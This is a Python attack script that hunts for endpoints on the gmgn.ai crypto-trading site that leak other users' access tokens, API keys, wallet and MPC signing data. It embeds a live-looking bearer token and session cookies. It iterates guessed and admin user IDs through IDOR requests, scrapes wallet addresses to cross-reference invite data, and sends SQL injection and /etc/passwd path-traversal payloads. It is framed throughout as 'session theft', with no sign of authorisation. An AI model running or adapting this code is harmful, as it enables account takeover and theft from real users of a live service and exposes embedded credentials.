#!/usr/bin/env python3
"""Hunt for endpoints that leak other users' access tokens or session data."""
import json
import requests
import base64

# Fresh access token from refresh
ACCESS_TOKEN = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL2FjY2VzcyIsImRhdGEiOnsidXNlcl9pZCI6IjhhNGMzZDYzLTg4ZmEtNDZjYy05ODRhLWU4ODVkNGFmZDFiNSIsImNsaWVudF9pZCI6ImdtZ25fd2ViXzIwMjYwNzEwLTE5NzItOWY0OWM4ZiIsImRldmljZV9pZCI6ImFjZjg5OGM3LTUwNjMtNGQwZi1iOTkyLWQxZTVkNTY4NDA5ZSIsImZhdGhlcl9pZCI6ImUzZDg1ZjU5LWMxMDUtNDA0My1hMDYwLTlhNmYxMGU3OWVmNyIsImZpbmdlcnByaW50IjoidjFmMTYwODU4OWNmZDU3Yjk1MDQzNDVhYTgyZGNlYTQxMiIsImFwcCI6ImdtZ24iLCJwbGF0Zm9ybSI6IndlYiJ9LCJleHAiOjE3ODM4NzExNzQsImlhdCI6MTc4Mzg2OTM3NCwiaXNzIjoiZ21nbi5haS9zaWduZXIiLCJqdGkiOiIyY2U4ZGUxYy1kNmIzLTQ4NDQtOWEwZS00NTRmYTU3YmZlOWIiLCJuYmYiOjE3ODM4NjkzNzQsInN1YiI6ImdtZ24uYWkvYWNjZXNzIiwidXNlcl9pZCI6IjhhNGMzZDYzLTg4ZmEtNDZjYy05ODRhLWU4ODVkNGFmZDFiNSIsInZlciI6IjEuMCJ9._L3vlOktOBNkkkbsDkb2vpoxjCqCAZ6jT2l_pVD0T_TjrvOXBEykZRZhzOAxY7fhr-ygabdgKIjRK4A4lmRceQ"

COOKIES = {
    "_ga_UGLVBMV4Z0": "GS1.2.1783868828922928.d557456dab82a63259179cf5603c7cb8.2et19uuic9LyMBph5Cx3hQ%3D%3D.mIlh9tL7rCIb2reoLkDLSA%3D%3D.NPARXjz5FNHX6j%2BVfQ4NyQ%3D%3D.V7iy1IQ16P92AotWIN9BjQ%3D%3D",
    "__cf_bm": "j_lS0Oscc4a0_D5Yn.nzhtaJpsJLgahl.qF9h1fJUuA-1783868831.6090767-1.0.1.1-iGgjPq_FDdPkkmhVdjThsxiacp4AYJCX5UtvDc4_w0LLXNqxGSlKq9EikgRmFAJSDr9Wc1NcKC1YhLPmejETCneXHyynzrMdC25Wbfm2NgnaqgV.M_rPFnN.poiDuvkC",
    "_ga": "GA1.1.1499118900.1783283677",
    "_csrf": "zp-fQVg4uAYlEsx7cronE5kO3GM4xIln",
    "_did": "c800ab0b7d01aa37bc93aacdcbce271e",
    "_wt": "AWpa2MXrjj0uvG6i4MZw3ZLOqVnU803QqMIf1eo",
    "sid": "gmgn|df83ac2f9a7e02144cb10ded0c21ad5c",
}

H = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/",
}

YOUR_USER_ID = "8a4c3d63-88fa-46cc-984a-e885d4afd1b5"

# Target user IDs to test
TARGET_USER_IDS = [
    "e3d85f59-c105-4043-a060-9a6f10e79ef7",  # father_id from JWT
    "8a4c3d63-88fa-46cc-984a-e885d4afd1b4",  # yours -1
    "8a4c3d63-88fa-46cc-984a-e885d4afd1b6",  # yours +1
    "00000000-0000-0000-0000-000000000001",  # potential admin
    "11111111-1111-1111-1111-111111111111",  # test ID
]

def check_response_for_tokens(response_text, endpoint_name):
    """Check if response contains any token-like strings."""
    text_lower = response_text.lower()
    
    findings = []
    
    # Look for JWT patterns (eyJ...)
    if "eyj" in text_lower:
        findings.append("🔥 POTENTIAL JWT FOUND")
    
    # Look for token keywords
    token_keywords = ["access_token", "refresh_token", "token", "bearer", "jwt", "session_token", "auth_token"]
    for keyword in token_keywords:
        if keyword in text_lower:
            findings.append(f"⚠️ Keyword '{keyword}' found")
    
    # Look for API keys
    if "api_key" in text_lower or "apikey" in text_lower or "key" in text_lower:
        findings.append("🔑 Keyword 'key' found")
    
    if findings:
        print(f"\n💀 [{endpoint_name}] POTENTIAL TOKEN LEAK:")
        for f in findings:
            print(f"   {f}")
        print(f"   Response preview: {response_text[:500]}")
        return True
    
    return False

def test_endpoint(name, method, url, payload=None, params=None):
    """Test endpoint and check for token leaks."""
    print(f"\n[{name}]")
    print(f"  URL: {url}")
    if payload:
        print(f"  Payload: {str(payload)[:100]}")
    
    try:
        if method == "GET":
            r = requests.get(url, headers=H, cookies=COOKIES, params=params, timeout=10)
        else:
            r = requests.post(url, headers=H, cookies=COOKIES, json=payload, params=params, timeout=10)
        
        print(f"  Status: {r.status_code}")
        
        if r.status_code == 200:
            # Check for tokens in response
            check_response_for_tokens(r.text, name)
            
            try:
                d = r.json()
                print(f"  Response: {json.dumps(d, indent=2)[:400]}")
                return d
            except:
                print(f"  Body: {r.text[:300]}")
        else:
            print(f"  Error: {r.text[:150]}")
            
    except Exception as e:
        print(f"  Exception: {e}")
    
    return None


print("="*80)
print("🔥 TOKEN HUNTING - ATTACK VECTORS FOR SESSION THEFT")
print("="*80)
print(f"Your user_id: {YOUR_USER_ID}")
print(f"Testing {len(TARGET_USER_IDS)} target user IDs for token leaks...")

# ============================================================================
# VECTOR 1: User Info Endpoints with user_id IDOR
# ============================================================================
print("\n" + "="*80)
print("VECTOR 1: User Info Endpoints (user_id manipulation)")
print("="*80)

for target_id in TARGET_USER_IDS[:3]:
    test_endpoint(
        f"user_info_{target_id[:8]}",
        "POST",
        "https://gmgn.ai/account/user_info",
        {"user_id": target_id}
    )

# Try GET method too
for target_id in TARGET_USER_IDS[:2]:
    test_endpoint(
        f"user_info_GET_{target_id[:8]}",
        "GET",
        f"https://gmgn.ai/account/user_info?user_id={target_id}",
    )

# ============================================================================
# VECTOR 2: Session/Auth Endpoints
# ============================================================================
print("\n" + "="*80)
print("VECTOR 2: Session/Auth Data Endpoints")
print("="*80)

auth_endpoints = [
    ("session_list", "GET", "https://gmgn.ai/account/sessions", None),
    ("session_info", "POST", "https://gmgn.ai/account/session_info", {}),
    ("auth_info", "POST", "https://gmgn.ai/account/auth_info", {}),
    ("login_info", "POST", "https://gmgn.ai/account/login_info", {}),
    ("token_info", "POST", "https://gmgn.ai/account/token_info", {}),
]

for name, method, url, payload in auth_endpoints:
    test_endpoint(name, method, url, payload)

# ============================================================================
# VECTOR 3: API Key Endpoints with user_id
# ============================================================================
print("\n" + "="*80)
print("VECTOR 3: API Key Enumeration (user_id IDOR)")
print("="*80)

# Your API keys baseline
test_endpoint(
    "your_api_keys",
    "GET",
    "https://gmgn.ai/api/v1/openapi/keys",
    params={
        "device_id": "acf898c7-5063-4d0f-b992-d1e5d568409e",
        "fp_did": "5154d56b50e3061629dca8bf8538b346",
        "client_id": "gmgn_web_20260712-1986-3641f8b",
    }
)

# Try with user_id parameter
for target_id in TARGET_USER_IDS[:3]:
    test_endpoint(
        f"api_keys_{target_id[:8]}",
        "GET",
        "https://gmgn.ai/api/v1/openapi/keys",
        params={
            "user_id": target_id,
            "device_id": "acf898c7-5063-4d0f-b992-d1e5d568409e",
        }
    )

# POST method
test_endpoint(
    "api_keys_POST",
    "POST",
    "https://gmgn.ai/api/v1/openapi/keys",
    {"user_id": TARGET_USER_IDS[0]}
)

# ============================================================================
# VECTOR 4: Referral System Token Leaks
# ============================================================================
print("\n" + "="*80)
print("VECTOR 4: Referral System Data (may expose tokens)")
print("="*80)

test_endpoint(
    "your_referral_code",
    "POST",
    "https://gmgn.ai/defi/quotation/v1/invite/get_tg_invitation_code",
    {}
)

test_endpoint(
    "referral_user_list",
    "POST",
    "https://gmgn.ai/defi/quotation/v1/invite/get_user_invitation_info_list",
    {}
)

# Try with user_id
for target_id in TARGET_USER_IDS[:2]:
    test_endpoint(
        f"referral_list_{target_id[:8]}",
        "POST",
        "https://gmgn.ai/defi/quotation/v1/invite/get_user_invitation_info_list",
        {"user_id": target_id}
    )

# ============================================================================
# VECTOR 5: Wallet Connection Endpoints (may expose tokens)
# ============================================================================
print("\n" + "="*80)
print("VECTOR 5: Wallet Connection Data")
print("="*80)

wallet_endpoints = [
    ("wallet_list", "POST", "https://gmgn.ai/account/wallet_list", {}),
    ("connected_wallets", "GET", "https://gmgn.ai/account/connected_wallets", None),
    ("wallet_info", "POST", "https://gmgn.ai/account/wallet_info", {}),
]

for name, method, url, payload in wallet_endpoints:
    test_endpoint(name, method, url, payload)

# Try wallet_list with user_id
for target_id in TARGET_USER_IDS[:2]:
    test_endpoint(
        f"wallet_list_{target_id[:8]}",
        "POST",
        "https://gmgn.ai/account/wallet_list",
        {"user_id": target_id}
    )

# ============================================================================
# VECTOR 6: Order/Trade History (may contain API keys or tokens)
# ============================================================================
print("\n" + "="*80)
print("VECTOR 6: Order/Trade History")
print("="*80)

trade_endpoints = [
    ("order_list", "POST", "https://gmgn.ai/account/order_list", {"limit": 10}),
    ("trade_history", "GET", "https://gmgn.ai/account/trade_history", None),
    ("order_history", "POST", "https://gmgn.ai/tapi/v1/order_history", {}),
    ("trading_bot_list", "POST", "https://gmgn.ai/tapi/v1/trading_bot/orders", {}),
]

for name, method, url, payload in trade_endpoints:
    test_endpoint(name, method, url, payload)

# ============================================================================
# VECTOR 7: MPC Wallet Data (may expose signing keys/tokens)
# ============================================================================
print("\n" + "="*80)
print("VECTOR 7: MPC Wallet Endpoints")
print("="*80)

mpc_endpoints = [
    ("mpc_status", "GET", "https://gmgn.ai/account/mpc/status", None),
    ("mpc_info", "POST", "https://gmgn.ai/account/mpc_info", {}),
    ("mpc_wallets", "POST", "https://gmgn.ai/account/mpc/wallets", {}),
    ("mpc_keys", "GET", "https://gmgn.ai/account/mpc/keys", None),
]

for name, method, url, payload in mpc_endpoints:
    test_endpoint(name, method, url, payload)

# ============================================================================
# VECTOR 8: Profile/Settings (may contain tokens in response)
# ============================================================================
print("\n" + "="*80)
print("VECTOR 8: Profile/Settings Endpoints")
print("="*80)

profile_endpoints = [
    ("profile", "GET", "https://gmgn.ai/account/profile", None),
    ("settings", "GET", "https://gmgn.ai/account/settings", None),
    ("preferences", "POST", "https://gmgn.ai/account/preferences", {}),
    ("account_data", "POST", "https://gmgn.ai/account/data", {}),
]

for name, method, url, payload in profile_endpoints:
    test_endpoint(name, method, url, payload)

# ============================================================================
# VECTOR 9: Invite System with Wallet Addresses (cross-reference attack)
# ============================================================================
print("\n" + "="*80)
print("VECTOR 9: Invite Info via Wallet Addresses")
print("="*80)

# Get active wallets first
print("[*] Scraping active wallets to test referral endpoints...")
try:
    r = requests.get(
        "https://gmgn.ai/defi/quotation/v1/rank/bsc/swaps/24h?limit=10",
        headers=H,
        cookies=COOKIES,
        timeout=10
    )
    if r.status_code == 200:
        d = r.json()
        if d.get("data", {}).get("rank"):
            wallets = [w["address"] for w in d["data"]["rank"][:5]]
            print(f"✅ Got {len(wallets)} wallets\n")
            
            # Test invite_info for each wallet (may leak user data)
            for wallet in wallets:
                test_endpoint(
                    f"invite_info_{wallet[:10]}",
                    "POST",
                    "https://gmgn.ai/tapi/v1/fourmeme/invite_info",
                    {"chain": "bsc", "from_address": wallet}
                )
except:
    pass

# ============================================================================
# VECTOR 10: Token in Error Messages
# ============================================================================
print("\n" + "="*80)
print("VECTOR 10: Force Errors (tokens may leak in error messages)")
print("="*80)

error_tests = [
    ("invalid_json", "POST", "https://gmgn.ai/account/user_info", "INVALID_JSON"),
    ("sql_inject", "POST", "https://gmgn.ai/account/user_info", {"user_id": "' OR 1=1--"}),
    ("path_traverse", "GET", "https://gmgn.ai/account/../../../etc/passwd", None),
]

for name, method, url, payload in error_tests:
    print(f"\n[{name}]")
    try:
        if method == "GET":
            r = requests.get(url, headers=H, cookies=COOKIES, timeout=5)
        else:
            if isinstance(payload, str):
                r = requests.post(url, headers=H, cookies=COOKIES, data=payload, timeout=5)
            else:
                r = requests.post(url, headers=H, cookies=COOKIES, json=payload, timeout=5)
        
        print(f"  Status: {r.status_code}")
        check_response_for_tokens(r.text, name)
    except:
        pass

print("\n" + "="*80)
print("📊 TOKEN HUNTING COMPLETE")
print("="*80)
print("\nCheck output above for:")
print("  🔥 JWT patterns (eyJ...)")
print("  🔑 API key references")
print("  ⚠️ Token keywords")
print("  💀 Successful 200 responses with data")
